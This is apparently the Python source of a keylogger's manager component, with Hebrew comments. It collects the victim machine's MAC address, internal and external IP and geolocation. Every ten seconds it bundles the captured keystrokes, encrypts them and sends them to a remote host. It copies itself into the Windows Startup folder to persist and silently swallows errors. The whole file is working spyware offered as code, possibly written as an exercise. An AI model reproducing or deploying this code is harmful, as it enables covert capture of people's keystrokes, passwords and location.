from keylogger_service import KeyloggerService
from encryptor import Encryptor
from network_writer import NetworkWriter
from getmac import get_mac_address
import requests
import socket
import time
import os
import shutil

class KeyloggerManager:

    def __init__(self,host:str,key:str):
        self.active = True
        self.keylogger = KeyloggerService()
        self.encryptor = Encryptor(key)
        self.writer = NetworkWriter(host)
        self.main()

    def main(self) ->None:

        #קבלת נתונים על המחשב
        mac_name = self.get_mac_details()
        internal_ip, external_ip = self.get_ip_details()
        location = self.get_computer_location()
        wrapper = {"mac_name": mac_name,
                   "internal_ip": internal_ip,
                   "external_ip": external_ip,
                   "location": location,
                   "data": {}}

        while self.active:
            try:
                #הזמן בין כל קבלת נתונים
                time.sleep(10)
                #קבלת הנתונים מהkeyloggerservice
                data = self.keylogger.data
                #הכנסת הנתונים לwrapper
                wrapper["data"] = data
                # הצפנת הנתונים
                wrapper = self.encryptor.encrypt(wrapper)
                #שליחת הנתונים וקבלת תשובה
                if self.writer.send_data(wrapper):
                    self.stop()
            except Exception as e:
                pass


    @staticmethod
    def get_mac_details() -> str:
        return get_mac_address()

    @staticmethod
    def get_ip_details() ->tuple:
        internal_ip = socket.gethostbyname(socket.gethostname())
        external_ip = requests.get("https://api64.ipify.org?format=json").json()["ip"]
        return internal_ip,external_ip

    def get_computer_location(self) -> str:
        url = "http://ip-api.com/json/"
        response = requests.get(url)
        data = response.json()

        if data["status"] == "success":
            return f"Country: {data['country']} Region: {data['regionName']} City:{data['city']}"
        else:
            return "Not found location"

    def stop(self) -> None:
        self.active = False

    @staticmethod
    def copy_file():
        #יצירת שם קובץ להעתקה
        source = "keylogger_manager.exe"
        #יצירת נתיב לתיקיית התחל של המחשב
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        #יצירת נתיב ליצרית קובץ
        destination = os.path.join(startup_dir, os.path.basename(source))

        try:
            #העתקת הקובץ לתפריט ההתחלה
            shutil.copy2(source, destination)
            #הפעלת הקובץ מתפריט ההתחלה
            os.startfile(destination)
            #כיבוי הקובץ הקיים כדי שלא יהיה כפול
            os._exit(0)
        except:
            pass


if __name__ == '__main__':
    host = "http://127.0.0.1:5000"
    key = "A"
    keylogger = KeyloggerManager(host,key)





